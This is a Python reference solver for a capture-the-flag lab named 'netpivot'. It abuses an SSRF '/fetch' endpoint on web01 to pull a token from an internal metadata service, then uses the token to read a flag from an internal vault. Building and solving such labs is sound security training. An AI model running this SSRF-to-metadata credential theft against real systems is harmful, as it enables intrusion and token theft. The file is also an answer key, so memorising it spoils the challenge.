"""Reference solver for netpivot: pivot through web01 to the internal network.

    python3 solve.py <host> <port>

web01 is the only reachable host. Use its SSRF (/fetch) to query the internal
metadata service for the token, then to query the internal vault with that token.
"""
import json, re, sys, urllib.parse, urllib.request

def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    def pivot(url):
        q = base + "/fetch?url=" + urllib.parse.quote(url, safe="")
        outer = json.loads(urllib.request.urlopen(q, timeout=15).read())
        return json.loads(outer["body"])
    # 1. pivot to the internal metadata service for the token
    meta = pivot("http://metadata:9000/latest/meta-data/internal-token")
    token = meta["token"]
    print(f"[+] internal token via metadata pivot: {token}")
    # 2. pivot to the internal vault with the token
    vault = pivot(f"http://vault:9000/flag?token={urllib.parse.quote(token)}")
    m = re.search(r"flag\{[^}]*\}", vault.get("flag", "") or json.dumps(vault))
    print(m.group(0) if m else vault)

if __name__ == "__main__":
    main()
